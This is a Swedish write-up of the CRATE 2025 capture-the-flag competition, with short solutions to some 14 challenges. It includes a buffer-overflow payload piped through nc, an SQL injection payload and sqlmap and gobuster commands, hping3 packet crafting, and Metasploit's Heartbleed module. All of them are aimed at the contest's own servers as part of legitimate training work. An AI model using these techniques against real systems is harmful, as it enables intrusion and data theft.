# CRATE 2025
2025-11-15 - 14:00-22:00

https://ctf.crate.foi.se/


## Pin1.5
Uppvärmning # 1


http://challs.crate.nu:36965/

6 siffror PIN som ska lösas.
Jag tittar i BURP suite och kommer åt func.js som visar koden, hur den fungerar, hittar att correctCode, dvs NDQ1NTEy, borde vara koden. Det är kodat i Base64. Så avkodade den och fick fram 445512 vilket gav mig koden och flaggan:

cratectf{funky_monkey}

## Felstavning
Uppvärmning # 2


http://challs.crate.nu:13568

BURP suite gav mig en script.js-fil som hade en url i sig som pekade till "flag12621561278416.html" som innehöll flaggan:

cratectf{det_är_inte_lätt_att_komma_ihåg_funktionsnamn_ibland}

## Grävarbete
Uppvärmning # 3


"Det finns en flagga lagrad för domänen flag.ctf.crate.foi.se."

Så jag kollade på https://mxtoolbox.com/ och letade rätt på en txt dns record med flaggan:

cratectf{maybe_start_using_txt_records_instead_of_s3_buckets}

## Ekobegäran
Uppvärmning # 4


"Något har blivit galet med vår ekoresponsgenerator."

ping eko.crate.nu

ping: Warning: invalid tv_usec -2315526826548157170 us
ping: Warning: time of day goes back (-7307485264893502032 s), taking countermeasures
64 bytes from 88.131.81.114: icmp_seq=4 ttl=255 time=0.000 ms
wrong data byte #16 should be 0x10 but was 0x61
#16     61 6e 64 20 69 74 20 73 68 61 6c 6c 20 62 65 20 65 63 68 6f 65 64 64 20 69 74 20 73 68 61 6c 6c 
#48     20 62 65 20 65 63 68 6f

Vilket blir från hex: and it shall be echoedd it shall be echo
cratectf{and_it_shall_be_echoedd_it_shall_be_echo} stämde inte.

Får återkomma hit sen..
Ganska mycket senare..

Wireshark avslöjade att det fanns mer information i pingen än det ovanstående, eko.crate.nu ville att man skulle skicka "gief flag" så jag körde:
sudo hping3 -1 88.131.81.114 -d 40 -e "gief flag"
Vilket gav mig svaret via Wireshark:

'[RU
EDXQr
cratectf{pingpongpingpongpingpong}ongpin

## Kan man verkligen ändra sig?
Uppvärmning #5


"Att läsa in 256 byte i en 8 byte stor buffert går väl bra? Kompilatorn borde väl klaga ifall koden är sårbar? I och för sig har det här programmet alltid behövt kompileras med varningar avstängda...

Uppgiften går att lösa i en webbläsarbaserad terminal via den här länken, eller genom att prata direkt med tjänsten via kommandot nedan.

http://challs.crate.nu:1337/wetty?image=ctf/kanmanverkligenandrasig"

Hmm..Den här löste sig självt i princip. Startade enligt instruktioner och skrev in ett lite för långt ord antar jag så jag kom åt flaggan. Ordet jag valde var "hejsanhopp"

cratectf{this_is_why_we_need_buffer_overflow_protections}

## Kan man verkligen ändra sig 2?
Uppvärmning #6


Här provade jag mig fram manuellt tills jag förstod hur man skulle få till rätt kombination.

echo -e "\x00\x00\x00\x00\x00\x00\x00\x00\x78\x56\x34\x12" | nc challs.crate.nu 21572

cratectf{surely_this_cannot_be_used_to_execute_code?_right?}

## 2⁰-faktorautentisering
Uppvärmning #7


"Visst är det jobbigt att hålla koll på allt det här med tvåfaktorautentisering? Vore det inte smidigt om man kunde ta emot tvåfaktor-SMS utan att ha telefonen med sig? Prova vår smidiga 2FAAS (2-factor-as-a-service)-tjänst idag!

Hur fungerar den? Jo vi använder en uppsättning toppmoderna mobiltelefoner där varje användare får en egen säker förbindelse till en av telefonerna via en serieport där man kan skicka AT-kommandon. Sen är det bara att ange tjänstens telefonnummer när man registrerar sig på valfri tjänst och så kan man ta emot koder utan att ha telefonen med sig!

nc challs.crate.nu 15167"

AT = OK
Allt annat = ERROR

Det krävdes en del googling för att hitta AT-kommandon som var relevanta.

AT+CMGL

+CMGL: 1,"REC UNREAD","+4612345678",,"18/11/24,13:55:16+01"
Din engångskod till Crate-CTF är cratectf{680279264}

cratectf{680279264}


## Eskuel
SQL?

http://challs.crate.nu:8901/

gobuster dir -u http://challs.crate.nu:8901/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php

Testar sqlmap med kommandot:
sqlmap -u http://challs.crate.nu:8901/ --forms --crawl=2

Det verkar vara postgresSQL.

WzzO%' AND (SELECT (CASE WHEN (5741=5741) THEN NULL ELSE CAST((CHR(70)||CHR(103)||CHR(114)||CHR(75)) AS NUMERIC) END)) IS NULL AND 'DRPk%'='DRPk

Det blev ett annat kommando:
sqlmap -u http://challs.crate.nu:8901/ -a --forms --crawl=2 vilket i princip är samma, tror jag svarade på följdfrågorna lite annorlunda dock. Vet inte riktigt vad jag gjorde annorlunda annat än att jag sökte efter "flag" istället för blank och körde random. Hmm.

sqlmap började i alla fall att spotta ur sig massor med mer information än tidigare och det gav flaggan till slut i strömmen av data.

Flaggan:
cratectf{efterföljarinsprutning}

## Eventually a Flag

Det var ett pythonprogram som körde otroligt långsamt pga recursion. Jag ändrade koden, med hjälp av ChatGPT tyvärr för att få det att fungera snabbare.
Bytte ut en stökig variant av Fibonacci  till:
def fibonacci(n):
    a, b = 0, 1
    for _ in range(n):
        a, b = b, a + b
    return a

cratectf{en ganska så lång flagga. mycket taskigt va? aja, den kanske tar slut någon gång.... eller?? abcdefghijklmnopqrstuvwxyzåäö:))) hejdå!}

## Kattallergiker

Blev tvungen att ta chatgpt till hjälp för att få fram korrekt kod för att få ut flaggan.
Jag var inte bekant alls med språket som jag använde till slut så den här kändes inte riktigt ok att få fram, ska forska mer runt varför det "språket" fungerade.

Provade först "while IFS= read -r line; do printf "%s\n" "$line"; done < flag.txt" Men de hade lagt till en fälla för det så det fick bli följande kod: 

while IFS= read -r -n 1 c; do
    printf "%02X " "'$c"
done < flag.txt
printf "\n"

Då fick jag ut flaggan i HEX:

44 65 6E 20 68 C3 A4 72 20 66 69 6C 65 20 69 6E 6E 65 68 C3 A5 6C 6C 65 72 20 66 6C 61 67 67 61 6E 2E 00 44 65 6E 20 C3 A4 72 20 62 61 72 61 20 6E C3 A5 67 72 61 20 72 61 64 65 72 20 6E 65 72 21 00 65 78 69 74 00 00 63 72 61 74 65 63 74 66 7B 64 65 74 5F C3 A4 72 5F C3 A4 6E 64 C3 A5 5F 72 C3 A4 74 74 5F 6E 69 63 65 5F 61 74 74 5F 68 61 5F 6C 69 74 65 5F 73 68 65 6C 6C 5F 75 74 69 6C 69 74 69 65 73 7D 00 00 1B 5B 32 4A 00 00 4D 65 6E 20 6F 6A 2C 20 64 65 74 20 66 61 6E 6E 73 20 76 69 73 73 74 20 65 6E 20 65 73 63 61 70 65 6B 61 72 61 6B 74 C3 A4 72 20 73 6F 6D 20 72 65 6E 73 61 72 20 73 6B C3 A4 72 6D 65 6E 20 69 20 66 69 6C 65 6E 20 73 74 72 61 78 20 65 66 74 65 72 20 66 6C 61 67 67 61 6E 21 00 / # printf "\n"

Och med hjälp av cyberchef så konverterade jag det till flaggan:

cratectf{det_är_ändå_rätt_nice_att_ha_lite_shell_utilities}

## En snäll liten server

CVE-2014-0160 = Heartbleed

Använde metasploits modul för heartbleed och fick ändra till TLS 1.1 från 1.0 för att den skulle visa flaggan när jag körde en dump.

cratectf{oj_den_var_visst_lite_for_snall}

## Frågeformuläret

cratectf{hoppas_vi_ses_igen_2026}

## Buslätt

Hållplats Buslätt, Uddevalla
58.312963331802, 11.878866311721913

cratectf{en_sl\u00e4tt_som_heter_bu}

## Evenemang

Lite pinsamt hur jag löste det, letade fram alla .exe-processer som startade med Id 4688 och sedan pilade jag runt tills en såg annorlunda ut, visade sig att parent process var 756.exe på en och det visade sig vara boven.

cratectf{756.exe}


---

<br>
14 av 35 flaggor tror jag? Helt ok.
<br><br>


![Resultatet](<Skärmbild 2025-11-16 resultat.png>)